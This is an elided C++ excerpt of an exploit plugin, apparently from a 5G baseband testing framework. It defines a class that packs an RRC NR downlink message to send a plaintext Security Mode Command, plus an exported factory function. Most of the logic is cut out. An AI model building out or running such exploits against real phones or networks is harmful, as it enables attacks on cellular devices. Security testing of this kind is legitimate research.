...
class PlaintextSecurityModeCommand : public Exploit
{
public:
  PlaintextSecurityModeCommand(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
    ...
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    ...
    if (!pack_dl_dcch_to_rrc_nr(rrc_nr_buffer, dl_dcch_msg)) {
      throw std::runtime_error("Failed to pack nas to rrc_nr\n");
    }
...
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new PlaintextSecurityModeCommand(dl_buffer_queue_, ul_buffer_queue_);
}
}